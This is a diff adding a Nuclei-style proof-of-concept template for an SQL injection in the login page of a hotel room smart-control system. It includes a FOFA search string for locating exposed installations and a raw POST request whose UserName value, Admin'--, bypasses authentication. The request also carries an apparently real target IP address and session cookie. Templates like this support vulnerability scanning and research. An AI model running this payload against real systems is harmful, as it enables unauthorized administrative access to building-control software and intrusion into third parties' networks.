@@ -1,0 +1,48 @@
+id: poc-btk4whqi4po36ckv
+info:
+  name: 中科金马酒店客房智能控制系统Login存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/btk4whqi4po36ckv'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: btk4whqi4po36ckv
+    fofa: body="login.aspx/Get_usertype"
+http:
+- raw:
+  - 'POST /login.aspx/Login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+
+    Accept-Encoding: gzip, deflate, br
+
+    Content-Type: application/json; charset=utf-8
+
+    X-Requested-With: XMLHttpRequest
+
+    Content-Length: 68
+
+    Origin: [http://112.5.155.171:8384](http://112.5.155.171:8384)
+
+    Connection: keep-alive
+
+    Referer: [http://112.5.155.171:8384/](http://112.5.155.171:8384/)
+
+    Cookie: ASP.NET_SessionId=35qu3tpakzbtd0vfau5rl5zk
+
+    Priority: u=0
+
+
+    {UserName: "Admin''--+",Password:"123456",TypeName:"系统管理员"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
